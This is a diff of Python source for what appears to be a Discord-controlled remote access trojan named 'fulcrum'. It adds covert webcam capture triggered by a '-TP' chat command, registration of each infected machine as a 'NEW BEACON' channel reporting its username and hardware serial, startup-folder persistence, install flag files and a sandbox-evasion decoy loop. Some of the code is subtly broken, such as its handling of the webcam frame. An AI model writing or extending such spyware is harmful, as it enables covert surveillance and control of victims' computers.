@@ -4,11 +4,19 @@ from dotenv import load_dotenv
 import ctypes
 import json
 import wmi
-from discord.ext import commands
+import time
+import cv2
+from discord.ext import commands, tasks
 
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
-
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
+
+FIRST_EXECUTION = False
+START_UP = True
+
+mode = "default"
+
+profile_data = None
 
 START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
 
@@ -20,6 +28,7 @@ TOKEN = os.getenv('TOKEN')
 intents = discord.Intents.default()
 intents.message_content = True
 intents.messages = True
+intents.guilds = True
 
 # Create the client instance with the specified intents
 client = discord.Client(intents=intents)
@@ -28,23 +37,47 @@ client = discord.Client(intents=intents)
 # Event handler for when the bot has successfully connected to Discord
 @client.event
 async def on_ready():
-    print(f'We have logged in as {client.user}')
+    print(f'logged in as {client.user}')
+    periodic_update_loop.start()
 
 
 # Event handler for when a message is sent in a channel the bot has access to
 @client.event
 async def on_message(message):
-    # Check if the message is sent by the bot itself to avoid infinite loops
-    if message.author == client.user:
+    global profile_data
+    if not profile_data:
+        with open("profile.json", "r") as json_file:
+            profile_data = json.load(json_file)
+
+    content = message.content
+
+    if message.author == client.user or str(message.channel) != profile_data["channel_name"]:
         return
 
-    if message.content.strip():
-        # Repeat the message
-        await message.channel.send(message.content)
+    print("message received")
+    if mode == "default":
+        if content.startswith("-TP"):
+            content = content.strip("-TP")
+            cam_index = 0
+            if content:
+                content = content.replace(" ", "")
+                cam_index = int(content)
+            take_picture(cam_index)
 
 
 def check_for_vm():
     return False
+
+def take_picture(cam_index):
+    print("-TP")
+    try:
+        cam = cv2.VideoCapture(cam_index)
+        frame = cam.read()
+        cv2.imwrite("frame", frame)
+        cam.release()
+    except:
+        print("error taking picture")
+
 def create_flag():
     try:
         os.mkdir(FLAG_PATH)
@@ -75,40 +108,58 @@ def create_unique_profile():
     profile = {
         'hardware_id': f'{mainboard_serial}',
         'user_name': f'{os.getlogin()}',
+        'channel_name': f'{os.getlogin()}-{mainboard_serial}',
     }
     with open('profile.json', 'w') as f:
         json.dump(profile, f)
 
 
-async def create_discord_channel():
-    print("create_discord_channel")
-    guild = client.guilds[0]  # Assumes the bot is in only one guild
-    channel_name = "new-text-channel"
+@tasks.loop(seconds=1)
+async def periodic_update_loop():
+    global profile_data
+    global FIRST_EXECUTION
+    global START_UP
+    if START_UP:
+        START_UP = False
+        print("start up")
+        if FIRST_EXECUTION:
+            print("first execution")
+            # neuen channel erstellen
+            try:
+                with open("profile.json", "r") as json_file:
+                    profile_data = json.load(json_file)
 
-    try:
-        new_channel = await guild.create_text_channel(channel_name)
-        print(f"Created new text channel: {new_channel.name}")
-    except discord.Forbidden:
-        print("Bot doesn't have the required permissions to create a channel")
-    except discord.HTTPException:
-        print("An error occurred while creating the channel")
+                guild = client.guilds[0]
+                new_channel = await guild.create_text_channel(profile_data["channel_name"])
+
+                await new_channel.send("***NEW BEACON CONNECTED***")
+                await new_channel.send(f'user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}')
+            except:
+                print("creating channel error")
+
 
 def main():
+    global FIRST_EXECUTION
     # überprüfen ob fulcrum in einem vm läuft
     if check_for_vm() is True:
         print("hello world")
         a = 1+1-42
         print(a)
-        return
+        while True:
+            time.sleep(1)
+            a += 1
 
-    print("test")
+    print("no vm")
 
     if check_flags() is False:
+        print("no flag")
         create_flag()
         get_persistence()
         create_unique_profile()
+        FIRST_EXECUTION = True
 
     # starten des discord bots
     client.run(TOKEN)
+
 
 main()
